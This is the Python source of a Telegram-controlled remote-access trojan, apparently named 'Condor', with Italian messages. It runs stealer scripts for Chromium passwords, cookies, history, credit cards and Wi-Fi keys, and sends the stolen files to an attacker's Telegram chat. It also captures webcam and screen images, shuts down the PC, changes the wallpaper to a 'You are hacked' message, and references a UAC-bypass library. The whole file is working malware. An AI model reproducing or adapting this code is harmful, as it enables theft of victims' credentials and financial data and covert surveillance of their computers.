from telegram.ext import Updater, CommandHandler
from telegram.ext import MessageHandler, Filters
import telegram.ext
import time,os
import emoji
from ctypes import windll
import urllib.request
import pyttsx3
import win32com.client as __wincl 
import subprocess
import pyscreenshot as ImageGrab
import win32api 
from winpwnage.core.prints import print_info
from winpwnage.core.scanner import scanner, function
from winpwnage.core.utils import *
import sys
from winpwnage.functions.uac.uacMethod2 import uacMethod2
from tkinter import *


def processamento():
	import win32com.client
	strComputer = "."
	objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
	objSWbemServices = objWMIService.ConnectServer(strComputer,"root\cimv2")

	# 1. Win32_DiskDrive
	colItems = objSWbemServices.ExecQuery("SELECT * FROM Win32_DiskDrive WHERE InterfaceType = \"USB\"")
	DiskDrive_DeviceID = colItems[0].DeviceID.replace('\\', '').replace('.', '')
	DiskDrive_Caption = colItems[0].Caption

	# 2. Win32_DiskDriveToDiskPartition
	colItems = objSWbemServices.ExecQuery("SELECT * from Win32_DiskDriveToDiskPartition")
	for objItem in colItems:
		if DiskDrive_DeviceID in str(objItem.Antecedent):
			DiskPartition_DeviceID = objItem.Dependent.split('=')[1].replace('"', '')

	# 3. Win32_LogicalDiskToPartition
	colItems = objSWbemServices.ExecQuery("SELECT * from Win32_LogicalDiskToPartition")
	for objItem in colItems:
		if DiskPartition_DeviceID in str(objItem.Antecedent):
			LogicalDisk_DeviceID = objItem.Dependent.split('=')[1].replace('"', '')


	# 4. Win32_LogicalDisk
	colItems = objSWbemServices.ExecQuery("SELECT * from Win32_LogicalDisk WHERE DeviceID=\"" + LogicalDisk_DeviceID + "\"")
	print()

	return str(LogicalDisk_DeviceID)


disco = processamento()
disco=disco+"\\"



TOKEN = ""
updater = Updater(TOKEN, use_context=True)
j = updater.job_queue
uu=updater.job_queue

def unknown(update, context):
    context.bot.send_message(chat_id=update.effective_chat.id, text="Scusa non ho compreso bene il comando!!")
    context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":dizzy_face:"))

def history(update, context):
	global disco
	avvio = f"{disco}\python\python.exe {disco}CrazyPy\\Stealer\\Chromium\\History.py"
	os.system(avvio)
	emoction=emoji.emojize(":scroll:")
	context.bot.send_message(chat_id=update.effective_chat.id, text= f"Invio history in corso... {emoction}")
	try:
		context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}output_file_history.txt', 'rb'))
		os.remove(f'{disco}output_file_history.txt')
	except FileNotFoundError:
		try:
			context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}\python\output_file_history.txt', 'rb'))
			os.remove(f'{disco}\python\output_file_history.txt')
		except FileNotFoundError:
			context.bot.send_message(chat_id=update.effective_chat.id, text=f"Mi dispiace ma non sono salvate le history del browser su questo pc")



def cookie(update, context):
	global disco
	avvio = f"{disco}\python\python.exe {disco}CrazyPy\\Stealer\\Chromium\\Cookies.py"
	os.system(avvio)
	emoction= emoji.emojize(":cookie:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Invio cookie in corso... {emoction}")
	try:
		context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}output_file_cookie.txt', 'rb'))
		os.remove(f'{disco}output_file_cookie.txt')
	except FileNotFoundError:
		try:
			context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}\python\output_file_cookie.txt', 'rb'))
			os.remove(f'{disco}\python\output_file_cookie.txt')
		except FileNotFoundError:
			context.bot.send_message(chat_id=update.effective_chat.id, text=f"Mi dispiace ma non sono salvati cookie su questo pc")

def monitor(update,context):
	secondi=context.args[0:]
	secondi=int(secondi)
	__SendMessageA = windll.user32.SendMessageA
	__HWND = 0xFFFF
	__WM_SYSCOMMAND = 0x112
	__SC_MONITORPOWER = 0xF170

	""" Monitor off """
	def Off():
	    __SendMessageA(__HWND, __WM_SYSCOMMAND, __SC_MONITORPOWER, 2)

	""" Monitor on """
	def On():
	    __SendMessageA(__HWND, __WM_SYSCOMMAND, __SC_MONITORPOWER, -1)

	""" Monitor standby """
	def Standby():
	    __SendMessageA(__HWND, __WM_SYSCOMMAND, __SC_MONITORPOWER, 1)

	Off()
	time.sleep(secondi)
	On()



def password(update, context):
	global disco
	avvio = f"{disco}\python\python.exe {disco}CrazyPy\\Stealer\\Chromium\\Passwords.py"
	os.system(avvio)
	emoction=emoji.emojize(":file_folder:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Invio password in corso... {emoction}")
	try:
		context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}output_file_password.txt', 'rb'))
		os.remove(f'{disco}output_file_password.txt')
	except FileNotFoundError:
		try:
			context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}\python\output_file_password.txt', 'rb'))
			os.remove(f'{disco}\python\output_file_password.txt')
		except FileNotFoundError:
			context.bot.send_message(chat_id=update.effective_chat.id, text=f"Mi dispiace ma non sono salvate password su questo pc")

def wifi(update, context):
	global disco
	avvio = f"{disco}\python\python.exe {disco}CrazyPy\\Stealer\\Wifi.py"
	os.system(avvio)
	emoction=emoji.emojize(":level_slider:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Invio informazioni sul wifi in corso... {emoction}")
	try:
		context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}\python\output_file_wifi.txt', 'rb'))
		os.remove(f'{disco}\python\output_file_wifi.txt')
	except FileNotFoundError:
		try:
			context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}\output_file_wifi.txt', 'rb'))
			os.remove(f'{disco}\output_file_wifi.txt')
		except FileNotFoundError:
			context.bot.send_message(chat_id=update.effective_chat.id, text=f"Mi dispiace ma non sono riuscito a recuperare le credenziali del wifi")


def cards(update, context):
	global disco
	avvio = f"{disco}\python\python.exe {disco}CrazyPy\\Stealer\\Chromium\\CreditCards.py"
	os.system(avvio)
	emoction=emoji.emojize(":credit_card:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Invio credit cards in corso... {emoction}")
	try:
		context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}output_file_card.txt', 'rb'))
		os.remove(f'{disco}output_file_card.txt')
	except FileNotFoundError:
		try:
			context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}\python\output_file_card.txt', 'rb'))
			os.remove(f'{disco}\python\output_file_card.txt')
		except FileNotFoundError:
			context.bot.send_message(chat_id=update.effective_chat.id, text=f"Mi dispiace ma non sono salvate credenziali di carte di credito su questo pc")

def power(update, context):
	comando=context.args[0:]
	if comando == "s":
		avviso= "Spegnimento"
		os.system('@shutdown /s /t 0')
	elif comando == "r":
		avviso= "Riavvio"
		os.system('@shutdown /r /t 0')
	elif comando == "l":
		avviso= "Disconnessione"
		os.system('@shutdown /l')
	elif comando == "h":
		avviso = "Ibernazione"
		os.system('@shutdown /h')

	emoction=emoji.emojize(":keyboard:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"{avviso} del pc... {emoction}")

def webcam(update,context):
	global disco
	avvio = f"{disco}\python\python.exe {disco}CrazyPy\\Spying\\Webcam.py"
	os.system(avvio)
	emoction9= emoji.emojize(":camera:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Acqusizione immagine dalla webcam in corso...{emoction9} ")
	try:
		context.bot.send_photo(chat_id=update.effective_chat.id,photo=open(f'{disco}webcam.png', 'rb'))
		os.remove(f'{disco}webcam.png')
	except FileNotFoundError:
		context.bot.send_photo(chat_id=update.effective_chat.id,photo=open(f'{disco}\python\webcam.png', 'rb'))
		os.remove(f'{disco}\python\webcam.png')

def screenshot(update,context):
	global disco
	im = ImageGrab.grab()
	im.save("screenshot.png")
	emoction999= emoji.emojize(":camera_with_flash:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Acqusizione screenshot desktop in corso...{emoction999} ")
	try:
		context.bot.send_photo(chat_id=update.effective_chat.id,photo=open(f'{disco}screenshot.png', 'rb'))
		os.remove(f'{disco}screenshot.png')
	except FileNotFoundError:
		context.bot.send_photo(chat_id=update.effective_chat.id,photo=open(f'{disco}\python\screenshot.png', 'rb'))
		os.remove(f'{disco}\python\screenshot.png')

def cdrom(update,context):
	return windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
	emoction999= emoji.emojize(":grinning_face:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Cd rom del pc vittima aperto {emoction999}")

def messaggio(update, context):
	testo=context.args[0:]
	testo=" ".join(testo)
	testo=str(testo)
	import pyttsx3
	import pythoncom
	from tkinter import messagebox 
	pythoncom.CoInitialize()
	engine = pyttsx3.init()
	rate = engine.getProperty('rate')   # getting details of current speaking rate                
	engine.setProperty('rate', 125)     # setting up new voice rate
	engine.say(testo)
	engine.runAndWait()
	messagebox.showerror("You are hacked...", testo) 
	emoction999= emoji.emojize(":grinning_face:")
	global disco
	image=f"{disco}CrazyPy\\hacker.png"
	_SPI_SETDESKWALLPAPER = 20 
	if not os.path.exists(image):
		raise FileNotFoundError(f"Image {repr(image)} not exists")
	windll.user32.SystemParametersInfoW(_SPI_SETDESKWALLPAPER, 0, image, 3)
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Sfondo Desktop cambiato {emoction999}")

def help1(update,context):
	emoction00=emoji.emojize(":smiling_face_with_sunglasses:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f" {emoction00} Tipi di attacchi di Condor :  {emoction00} ")
	emoction0=emoji.emojize(":file_folder:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_password {emoction0} : Ottenere un file con le password")
	emoction2=emoji.emojize(":scroll:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_history {emoction2} : Ottenere la history")
	emoction3= emoji.emojize(":cookie:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_cookie {emoction3} : Ottenere i cookies")
	emoction5= emoji.emojize(":credit_card:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_credit_cards {emoction5} : Ottenere le carte di credito")
	emoction4= emoji.emojize(":level_slider:")
	emoction44= emoji.emojize(":key:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_wifi {emoction44}: Ottenere il wifi")
	emoction8= emoji.emojize(":keyboard:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/power (s,r,l,h)-->(/Shutdown/Reboot/LogOff/Hibernate {emoction4} : Spegnere riavviare ibernare o disconnettere il pc")
	emoction9= emoji.emojize(":camera:")
	emoction999= emoji.emojize(":camera_with_flash:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_screenshot  {emoction999}: Ottieni lo screenshot del desktop della vittima")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/Webcam {emoction9}: Ottieni la foto dell'utente")
	emoction9999= emoji.emojize(":microphone:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/Message testo_en {emoction9999}: Cambi sfondo desktop alla vittima e invii un vocale")
	emoction556=emoji.emojize(":desktop_computer:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/Monitor n_secondi  {emoction556} : Spegni e riaccendi il monitor del pc dopo tot secondi")
	emoction5566=emoji.emojize(":dvd:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/Open_Cd_rom {emoction5566} : Apri cdrom del pc vittima")
	emoction99=emoji.emojize(":double_exclamation_mark:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/help {emoction99}: Vi mostro i comandi che potete usare")

def callback_minute(context: telegram.ext.CallbackContext):
	emoction556=emoji.emojize(":sparkles:")
	context.bot.send_message(chat_id='502522267',text=f'{emoction556} Bot connesso al pc vittima')
	time.sleep(1)
	context.bot.send_message(chat_id='502522267',text=f'Ti lascio il comando /help per vedere tutte le funzioni che ho a disposizione')

def main():
	#global disco 
	print("Sto ascoltando...")
	#uacMethod2(["c:\\windows\\system32\\cmd.exe", "/k", f"start {disco}CrazyPy\\windows_disable.vbs"])
	dp = updater.dispatcher
	dp.add_handler(CommandHandler('help', help1))
	dp.add_handler(CommandHandler('get_password',password))
	dp.add_handler(CommandHandler('get_history',history))
	dp.add_handler(CommandHandler('get_cookie',cookie))
	dp.add_handler(CommandHandler('get_credit_cards',cards))
	dp.add_handler(CommandHandler('get_wifi',wifi))
	dp.add_handler(CommandHandler('get_screenshot',screenshot))
	dp.add_handler(CommandHandler('Webcam',webcam))
	dp.add_handler(CommandHandler('Open_Cd_rom',cdrom))
	dp.add_handler(CommandHandler('power',power,pass_args=True,pass_chat_data=True))
	dp.add_handler(CommandHandler('Message',messaggio,pass_args=True,pass_chat_data=True))
	dp.add_handler(CommandHandler('Monitor',monitor,pass_args=True,pass_chat_data=True))
	
	
	job_minute = j.run_repeating(callback_minute, interval=10800, first=0)
	unknown_handler = MessageHandler(Filters.command, unknown)
	dp.add_handler(unknown_handler)
	updater.start_polling()
	updater.idle()


main()


